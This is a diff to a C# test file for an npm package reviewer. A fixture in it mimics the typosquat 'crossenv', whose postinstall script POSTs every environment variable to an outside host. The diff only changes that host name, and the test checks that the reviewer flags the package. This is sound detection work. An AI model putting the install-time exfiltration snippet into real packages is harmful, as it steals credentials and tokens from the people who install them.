@@ -83,7 +83,7 @@ public sealed class PackageReviewTests : IDisposable
     {
         var r = Review(Tgz("crossenv.tgz",
             ("package/package.json", """{"name":"crossenv","version":"6.1.1","scripts":{"postinstall":"node package-setup.js"}}"""),
-            ("package/package-setup.js", "const http=require('http');\nconst data=JSON.stringify(process.env);\nconst req=http.request({host:'npm.hacktask.net',path:'/log/',method:'POST'});req.write(data);req.end();")));
+            ("package/package-setup.js", "const http=require('http');\nconst data=JSON.stringify(process.env);\nconst req=http.request({host:'collector.example.net',path:'/log/',method:'POST'});req.write(data);req.end();")));
         Assert.Equal("noteworthy", r.Review);
         Assert.Contains(r.Findings, f => f.Category == "name" && f.Detail.Contains("'cross-env'", StringComparison.Ordinal));
     }
